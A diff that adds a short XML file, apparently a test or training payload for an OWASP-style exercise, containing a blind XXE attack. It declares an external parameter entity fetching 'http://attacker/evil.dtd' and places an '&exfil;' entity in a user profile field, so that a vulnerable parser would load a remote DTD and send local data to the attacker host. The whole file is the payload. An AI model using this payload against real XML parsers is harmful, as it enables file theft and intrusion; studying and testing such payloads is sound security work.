@@ -1,0 +1,13 @@
+<?xml version="1.0" ?>
+  <!DOCTYPE r [
+  <!ELEMENT r ANY >
+  <!ENTITY % sp SYSTEM "http://attacker/evil.dtd">
+  %sp;
+  %final;
+]>
+
+<owasp>
+	<username>attacker</username>
+	<email>attacker@gmail.com</email>
+	<instagram>&exfil;</instagram>
+</owasp>
